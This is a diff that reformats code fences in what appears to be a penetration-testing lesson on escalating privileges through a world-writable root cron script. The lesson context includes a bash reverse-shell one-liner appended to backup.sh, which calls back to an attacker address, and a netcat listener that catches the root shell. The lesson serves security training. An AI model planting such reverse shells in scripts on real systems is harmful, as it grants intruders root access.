@@ -10,8 +10,7 @@ Certain applications create cron files in the `/etc/cron.d` directory and may be
 
 First, let's look around the system for any writeable files or directories. The file `backup.sh` in the `/dmz-backups` directory is interesting and seems like it could be running on a cron job.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
 
 /etc/cron.daily/backup
@@ -27,8 +26,7 @@ hiimeins@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
 
 A quick look in the `/dmz-backups` directory shows what appears to be files created every three minutes. This seems to be a major misconfiguration. Perhaps the sysadmin meant to specify every three hours like `0 */3 * * *` but instead wrote `*/3 * * * *`, which tells the cron job to run every three minutes. The second issue is that the `backup.sh` shell script is world writeable and runs as root.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ls -la /dmz-backups/
 
 total 36
@@ -47,8 +45,7 @@ We can confirm that a cron job is running using [pspy](https://github.com/Domini
 
 Let's run `pspy` and have a look. The `-pf` flag tells the tool to print commands and file system events and `-i 1000` tells it to scan [procfs](https://man7.org/linux/man-pages/man5/procfs.5.html) every 1000ms (or every second).
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ./pspy64 -pf -i 1000
 
 pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
@@ -103,8 +100,7 @@ From the above output, we can see that a cron job runs the `backup.sh` script lo
 
 We can look at the shell script and append a command to it to attempt to obtain a reverse shell as root. If editing a script, make sure to `ALWAYS` take a copy of the script and/or create a backup of it. We should also attempt to append our commands to the end of the script to still run properly before executing our reverse shell command.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ cat /dmz-backups/backup.sh 
 
 #!/bin/bash
@@ -116,8 +112,7 @@ hiimeins@htb[/htb]$ cat /dmz-backups/backup.sh
 
 We can see that the script is just taking in a source and destination directory as variables. It then specifies a file name with the current date and time of backup and creates a tarball of the source directory, the web root directory. Let's modify the script to add a [Bash one-liner reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
 
-```
-        bash
+```bash
 #!/bin/bash
 SRCDIR="/var/www/html"
 DESTDIR="/dmz-backups/"
@@ -129,8 +124,7 @@ bash -i >& /dev/tcp/10.10.14.3/443 0>&1
 
 We modify the script, stand up a local `netcat` listener, and wait. Sure enough, within three minutes, we have a root shell!
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ nc -lnvp 443
 
 listening on [any] 443 ...
